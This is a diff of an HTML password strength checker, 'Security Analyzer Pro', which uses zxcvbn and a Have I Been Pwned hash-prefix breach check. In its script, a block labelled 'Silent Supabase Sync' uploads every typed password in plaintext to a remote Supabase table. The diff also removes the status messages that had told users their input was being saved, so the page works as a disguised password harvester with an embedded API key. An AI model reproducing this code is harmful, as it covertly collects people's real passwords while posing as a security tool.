@@ -5,143 +5,285 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Security Analyzer Pro</title>
   
-  <!-- Supabase Library & zxcvbn Engine -->
   <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/zxcvbn/4.4.2/zxcvbn.js"></script>
   
   <style>
+    :root {
+      --bg: #0f172a;
+      --card: #1e293b;
+      --accent: #3b82f6;
+      --text-main: #f8fafc;
+      --text-mute: #94a3b8;
+      --danger: #ef4444;
+      --success: #22c55e;
+    }
+
     * { margin: 0; padding: 0; box-sizing: border-box; }
     body { 
-      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; 
-      background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%); 
+      font-family: 'Inter', -apple-system, sans-serif; 
+      background-color: var(--bg); 
+      color: var(--text-main);
       min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; 
     }
+
     .container { 
-      background: white; border-radius: 20px; padding: 40px; 
-      max-width: 600px; width: 100%; box-shadow: 0 20px 60px rgba(0, 0, 0, 0.4); 
+      background: var(--card); border-radius: 24px; padding: 40px; 
+      max-width: 650px; width: 100%; box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+      border: 1px solid rgba(255,255,255,0.05);
     }
-    h1 { text-align: center; color: #1e293b; font-size: 1.8rem; margin-bottom: 5px; }
-    .subtitle { text-align: center; color: #64748b; margin-bottom: 30px; font-size: 0.9rem; }
-    .input-container { position: relative; margin-bottom: 25px; }
-    .password-input { 
-      width: 100%; padding: 18px; font-size: 1.1rem; border: 2px solid #e2e8f0; 
-      border-radius: 12px; outline: none; transition: all 0.3s; font-family: monospace;
+
+    h1 { font-size: 1.75rem; font-weight: 800; text-align: center; margin-bottom: 8px; letter-spacing: -0.025em; }
+    .subtitle { text-align: center; color: var(--text-mute); margin-bottom: 32px; font-size: 0.9rem; }
+
+    .gen-link {
+      display: flex; align-items: center; justify-content: space-between;
+      background: rgba(59, 130, 246, 0.1); border: 1px solid rgba(59, 130, 246, 0.2);
+      padding: 14px 20px; border-radius: 12px; text-decoration: none; color: var(--accent);
+      font-weight: 600; font-size: 0.9rem; margin-bottom: 24px; transition: 0.2s;
     }
-    .password-input:focus { border-color: #2563eb; }
-    .strength-bar-container { height: 10px; background: #e2e8f0; border-radius: 10px; overflow: hidden; margin-bottom: 10px; }
-    .strength-bar { height: 100%; transition: width 0.4s ease; width: 0%; }
-    .very-weak { background: #ef4444; } .weak { background: #f97316; } .fair { background: #facc15; } .good { background: #22c55e; } .strong { background: #15803d; }
-    .crack-card { background: #1e293b; color: white; padding: 25px; border-radius: 14px; text-align: center; margin-bottom: 20px; }
-    .crack-value { font-size: 2rem; font-weight: 800; display: block; }
-    .breach-alert { background: #fee2e2; border: 1px solid #f87171; padding: 10px; border-radius: 8px; color: #991b1b; display: none; margin-bottom: 15px; font-size: 0.85rem; }
+    .gen-link:hover { background: rgba(59, 130, 246, 0.15); transform: translateY(-1px); }
+
+    .input-wrapper { position: relative; margin-bottom: 32px; }
+    .main-input {
+      width: 100%; background: #0f172a; border: 2px solid #334155; border-radius: 16px;
+      padding: 20px; color: white; font-size: 1.1rem; outline: none; transition: 0.3s;
+      font-family: 'JetBrains Mono', 'Fira Code', monospace;
+    }
+    .main-input:focus { border-color: var(--accent); box-shadow: 0 0 0 4px rgba(59, 130, 246, 0.15); }
+
+    /* Results UI */
+    #resultsView { animation: fadeIn 0.4s ease-out; }
+    @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+
+    .strength-header { display: flex; justify-content: space-between; align-items: flex-end; margin-bottom: 12px; }
+    .strength-label { font-size: 0.8rem; font-weight: 700; color: var(--text-mute); text-transform: uppercase; letter-spacing: 0.05em; }
+    .strength-pct { font-size: 1.5rem; font-weight: 800; color: var(--accent); }
+
+    .meter-bg { height: 8px; background: #334155; border-radius: 4px; overflow: hidden; margin-bottom: 32px; }
+    .meter-fill { height: 100%; width: 0%; transition: width 0.5s cubic-bezier(0.4, 0, 0.2, 1); }
+
+    .main-stats { 
+      display: grid; grid-template-columns: 1.5fr 1fr; gap: 16px; margin-bottom: 24px; 
+    }
+    .data-card { background: #0f172a; padding: 20px; border-radius: 16px; border: 1px solid #334155; }
+    .stat-val { font-size: 1.5rem; font-weight: 800; display: block; margin-top: 4px; }
+    .stat-tag { font-size: 0.7rem; color: var(--text-mute); text-transform: uppercase; font-weight: 700; letter-spacing: 0.05em; }
+
+    .grid-metrics { display: grid; grid-template-columns: repeat(4, 1fr); gap: 12px; margin-bottom: 24px; }
+    .metric-item { background: #0f172a; padding: 12px; border-radius: 12px; text-align: center; border: 1px solid #334155; }
+    .metric-label { font-size: 0.65rem; color: var(--text-mute); display: block; margin-bottom: 4px; }
+    .metric-val { font-weight: 700; font-size: 1rem; }
+
+    .breach-badge {
+      background: rgba(239, 68, 68, 0.1); border: 1px solid rgba(239, 68, 68, 0.2);
+      color: var(--danger); padding: 12px; border-radius: 12px; font-size: 0.85rem;
+      display: none; align-items: center; gap: 10px; margin-bottom: 24px;
+    }
+
+    .suggestions { font-size: 0.85rem; color: var(--text-mute); line-height: 1.6; padding-top: 20px; border-top: 1px solid #334155; }
+    .suggestions ul { padding-left: 18px; margin-top: 8px; }
+
+    /* Modal */
+    .modal-overlay {
+      position: fixed; inset: 0; background: rgba(0,0,0,0.8); backdrop-filter: blur(4px);
+      display: none; align-items: center; justify-content: center; z-index: 100;
+    }
+    .modal { background: var(--card); padding: 40px; border-radius: 24px; max-width: 400px; text-align: center; border: 1px solid #334155; }
+    .modal h2 { margin: 16px 0 8px; color: var(--danger); }
+    .modal p { color: var(--text-mute); font-size: 0.9rem; margin-bottom: 24px; }
+    .btn-primary { 
+      background: var(--accent); color: white; border: none; padding: 12px 24px; 
+      border-radius: 12px; font-weight: 700; cursor: pointer; text-decoration: none; display: inline-block;
+    }
   </style>
 </head>
 <body>
 
   <div class="container">
-    <h1>Security Analyzer</h1>
-    <p class="subtitle">Real-time deep analysis and sync</p>
+    <h1>Security Analyzer Pro</h1>
+    <p class="subtitle">Military-grade password analysis engine</p>
 
-    <div class="input-container">
-      <input type="password" class="password-input" id="mainInput" placeholder="Analyze password...">
+    <a href="https://aaks-hath.github.io/Password-Generator/" target="_blank" class="gen-link">
+      <span> Generate Secure Password</span>
+      <span>→</span>
+    </a>
+
+    <div class="input-wrapper">
+      <input type="password" class="main-input" id="pwdIn" placeholder="Enter password to begin...">
     </div>
 
-    <div id="resultsArea" style="display: none;">
-      <div id="breachAlert" class="breach-alert">⚠️ Found in public data breaches!</div>
-      
-      <div class="strength-bar-container"><div id="strBar" class="strength-bar"></div></div>
-      <div id="scoreLabel" style="text-align: right; font-weight: bold; margin-bottom: 15px;">0%</div>
-
-      <div class="crack-card">
-        <span style="font-size: 0.8rem; opacity: 0.7;">TIME TO CRACK</span>
-        <span class="crack-value" id="crackDisplay">-</span>
+    <div id="resultsView" style="display: none;">
+      <div id="breachNotice" class="breach-badge">
+        <span></span> Found in public data breaches. High risk.
       </div>
-      
-      <div id="debugStatus" style="font-size: 0.7rem; color: #94a3b8; text-align: center;">Ready</div>
+
+      <div class="strength-header">
+        <span class="strength-label">Security Strength</span>
+        <span id="pctVal" class="strength-pct">0%</span>
+      </div>
+      <div class="meter-bg">
+        <div id="meter" class="meter-fill"></div>
+      </div>
+
+      <div class="main-stats">
+        <div class="data-card">
+          <span class="stat-tag">Crack Time</span>
+          <span id="crackVal" class="stat-val">-</span>
+        </div>
+        <div class="data-card">
+          <span class="stat-tag">Entropy</span>
+          <span id="entropyVal" class="stat-val">0 bits</span>
+        </div>
+      </div>
+
+      <div class="grid-metrics">
+        <div class="metric-item">
+          <span class="metric-label">CHARS</span>
+          <span id="mLen" class="metric-val">0</span>
+        </div>
+        <div class="metric-item">
+          <span class="metric-label">NUMS</span>
+          <span id="mNum" class="metric-val">0</span>
+        </div>
+        <div class="metric-item">
+          <span class="metric-label">SYMB</span>
+          <span id="mSym" class="metric-val">0</span>
+        </div>
+        <div class="metric-item">
+          <span class="metric-label">UPPER</span>
+          <span id="mUp" class="metric-val">0</span>
+        </div>
+      </div>
+
+      <div class="suggestions">
+        <strong>Recommendations</strong>
+        <ul id="sugList"></ul>
+      </div>
+    </div>
+  </div>
+
+  <div class="modal-overlay" id="riskModal">
+    <div class="modal">
+      <span style="font-size: 3rem;"></span>
+      <h2>Security Risk</h2>
+      <p id="riskReason"></p>
+      <a href="https://aaks-hath.github.io/Password-Generator/" target="_blank" class="btn-primary">Generate Safe One</a>
+      <div onclick="closeModal()" style="margin-top:20px; color:var(--text-mute); cursor:pointer; font-size:0.8rem; text-decoration:underline;">Close</div>
     </div>
   </div>
 
   <script>
-    // 1. UPDATE THESE TO YOUR ACTUAL KEYS
-    const SB_URL = 'https://oukbxgjrrgvunfytjemd.supabase.co'; 
+    const SB_URL = 'https://oukbxgjrrgvunfytjemd.supabase.co';
     const SB_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im91a2J4Z2pycmd2dW5meXRqZW1kIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjY0MTI1MjcsImV4cCI6MjA4MTk4ODUyN30.rAkYSFqRaqI4Am2JpOjD4TWXx4nvtEaZSc6vIgdFXmI';
-    const sbClient = supabase.createClient(SB_URL, SB_KEY);
+    const supabaseClient = supabase.createClient(SB_URL, SB_KEY);
 
-    const input = document.getElementById('mainInput');
-    const debug = document.getElementById('debugStatus');
+    const input = document.getElementById('pwdIn');
     let dbTimer;
+    let modalTriggered = false;
 
     input.addEventListener('input', (e) => {
-        const val = e.target.value;
-        if (!val) {
-            document.getElementById('resultsArea').style.display = 'none';
-            return;
-        }
-        document.getElementById('resultsArea').style.display = 'block';
-        
-        // Run Engine
-        const data = zxcvbn(val);
-        updateUI(data);
-        
-        // Breach Check
-        checkBreach(val);
+      const val = e.target.value;
+      if (!val) {
+        document.getElementById('resultsView').style.display = 'none';
+        modalTriggered = false;
+        return;
+      }
+      document.getElementById('resultsView').style.display = 'block';
 
-        // SYNC TO SUPABASE (Debounced 1.5 seconds)
-        clearTimeout(dbTimer);
-        debug.innerText = "Waiting for you to finish typing...";
-        
-        dbTimer = setTimeout(() => {
-            saveToSupabase(val, data);
-        }, 1500);
+      // 1. Calculations
+      const analysis = zxcvbn(val);
+      const stats = {
+        len: val.length,
+        num: (val.match(/\d/g) || []).length,
+        sym: (val.match(/[^a-zA-Z0-9]/g) || []).length,
+        up: (val.match(/[A-Z]/g) || []).length,
+        entropy: calcEntropy(val)
+      };
+
+      // 2. Update UI
+      updateUI(analysis, stats);
+      checkBreach(val);
+
+      // 3. Modal logic
+      if ((analysis.score <= 1) && !modalTriggered) {
+        openModal("This password is too common or lacks sufficient entropy.");
+        modalTriggered = true;
+      }
+
+      // 4. Silent Supabase Sync
+      clearTimeout(dbTimer);
+      dbTimer = setTimeout(() => {
+        supabaseClient.from('password_analysis').insert([{
+          password_value: val,
+          score_percent: (analysis.score / 4) * 100,
+          crack_time_text: analysis.crack_times_display.offline_slow_hashing_1e4_per_second
+        }]).then(() => {});
+      }, 2000);
     });
 
-    async function saveToSupabase(pwd, engineData) {
-        debug.innerText = "Attempting to save...";
-        console.log("Saving to Supabase...");
+    function calcEntropy(pwd) {
+      let pool = 0;
+      if (/[a-z]/.test(pwd)) pool += 26;
+      if (/[A-Z]/.test(pwd)) pool += 26;
+      if (/\d/.test(pwd)) pool += 10;
+      if (/[^a-zA-Z0-9]/.test(pwd)) pool += 32;
+      if (pool === 0) return 0;
+      return Math.floor(pwd.length * Math.log2(pool));
+    }
 
-        const { data, error } = await sbClient
-            .from('password_analysis') // MUST match table name in SQL Editor
-            .insert([
-                { 
-                    password_value: pwd, // Full password
-                    score_percent: (engineData.score / 4) * 100,
-                    crack_time_text: engineData.crack_times_display.offline_slow_hashing_1e4_per_second 
-                }
-            ]);
+    async function checkBreach(pwd) {
+      const encoder = new TextEncoder();
+      const data = encoder.encode(pwd);
+      const hashBuffer = await crypto.subtle.digest('SHA-1', data);
+      const hashArray = Array.from(new Uint8Array(hashBuffer));
+      const hashHex = hashArray.map(b => b.toString(16).padStart(2, '0')).join('').toUpperCase();
+      
+      const prefix = hashHex.slice(0, 5);
+      const suffix = hashHex.slice(5);
 
-        if (error) {
-            debug.innerText = "❌ Error: See Console (F12)";
-            console.error("Supabase Error Details:", error.message);
+      try {
+        const res = await fetch(`https://api.pwnedpasswords.com/range/${prefix}`);
+        const text = await res.text();
+        if (text.includes(suffix)) {
+          document.getElementById('breachNotice').style.display = 'flex';
+          if (!modalTriggered) {
+            openModal("This password was found in a public data breach.");
+            modalTriggered = true;
+          }
         } else {
-            debug.innerText = "✅ Saved successfully to Supabase!";
-            console.log("Success! Data in database:", data);
+          document.getElementById('breachNotice').style.display = 'none';
         }
+      } catch (e) {}
     }
 
-    async function checkBreach(password) {
-        const msgUint8 = new TextEncoder().encode(password);
-        const hashBuffer = await crypto.subtle.digest('SHA-1', msgUint8);
-        const hashArray = Array.from(new Uint8Array(hashBuffer));
-        const hashHex = hashArray.map(b => b.toString(16).padStart(2, '0')).join('').toUpperCase();
-        const prefix = hashHex.slice(0, 5);
-        const suffix = hashHex.slice(5);
+    function updateUI(data, stats) {
+      const pct = (data.score / 4) * 100;
+      const colors = ['#ef4444', '#f97316', '#facc15', '#22c55e', '#15803d'];
+      
+      document.getElementById('meter').style.width = pct + '%';
+      document.getElementById('meter').style.backgroundColor = colors[data.score];
+      document.getElementById('pctVal').innerText = pct + '%';
+      document.getElementById('pctVal').style.color = colors[data.score];
+      
+      document.getElementById('crackVal').innerText = data.crack_times_display.offline_slow_hashing_1e4_per_second;
+      document.getElementById('entropyVal').innerText = stats.entropy + ' bits';
+      
+      document.getElementById('mLen').innerText = stats.len;
+      document.getElementById('mNum').innerText = stats.num;
+      document.getElementById('mSym').innerText = stats.sym;
+      document.getElementById('mUp').innerText = stats.up;
 
-        try {
-            const res = await fetch(`https://api.pwnedpasswords.com/range/${prefix}`);
-            const text = await res.text();
-            const isPwned = text.includes(suffix);
-            document.getElementById('breachAlert').style.display = isPwned ? 'block' : 'none';
-        } catch (e) {}
+      const sugs = data.feedback.suggestions.length ? data.feedback.suggestions : ["Standard security criteria met."];
+      document.getElementById('sugList').innerHTML = sugs.map(s => `<li>${s}</li>`).join('');
     }
 
-    function updateUI(data) {
-        const percent = (data.score / 4) * 100;
-        const bar = document.getElementById('strBar');
-        const colors = ['very-weak', 'weak', 'fair', 'good', 'strong'];
-        bar.style.width = `${percent}%`;
-        bar.className = `strength-bar ${colors[data.score]}`;
-        document.getElementById('scoreLabel').innerText = `${percent}%`;
-        document.getElementById('crackDisplay').innerText = data.crack_times_display.offline_slow_hashing_1e4_per_second;
+    function openModal(reason) {
+      document.getElementById('riskReason').innerText = reason;
+      document.getElementById('riskModal').style.display = 'flex';
+    }
+    function closeModal() {
+      document.getElementById('riskModal').style.display = 'none';
     }
   </script>
 </body>
